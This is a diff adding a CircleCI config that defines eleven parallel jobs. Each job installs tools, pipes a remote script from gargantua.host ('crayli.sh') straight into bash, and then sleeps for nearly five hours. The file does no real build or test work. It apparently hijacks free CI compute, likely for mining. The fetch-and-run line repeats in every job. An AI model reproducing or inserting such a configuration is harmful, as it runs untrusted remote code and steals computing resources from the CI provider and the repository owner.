@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  redistyras:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redistyras10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - redistyras
+      - redistyras1
+      - redistyras2
+      - redistyras3
+      - redistyras4
+      - redistyras5
+      - redistyras6
+      - redistyras7
+      - redistyras8
+      - redistyras9
+      - redistyras10
